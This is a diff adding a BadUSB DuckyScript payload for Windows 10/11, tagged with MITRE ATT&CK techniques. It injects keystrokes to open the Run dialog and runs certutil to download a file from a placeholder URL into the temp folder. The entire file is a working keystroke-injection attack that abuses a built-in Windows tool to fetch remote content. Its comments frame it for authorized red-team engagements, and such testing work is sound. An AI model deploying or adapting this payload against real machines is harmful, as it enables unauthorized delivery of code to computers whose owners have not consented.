@@ -1,0 +1,16 @@
+REM BadUSB - Windows LOLBIN Execution via certutil (Run Dialog)
+REM Target: Windows 10/11 (tested on 22H2/23H2)
+REM Opens Run dialog via WIN+R and downloads a file using certutil
+REM MITRE ATT&CK: T1105, T1027, T1200
+
+REM Wait for host to be ready
+DELAY 1000
+
+REM Open Run dialog
+GUI r
+DELAY 600
+
+REM Execute certutil download via cmd
+REM Replace the URL with actual test infrastructure in authorized engagements
+STRING cmd /c certutil -urlcache -split -f https://example.com/test.txt %TEMP%\badusb_certutil_test.txt
+ENTER
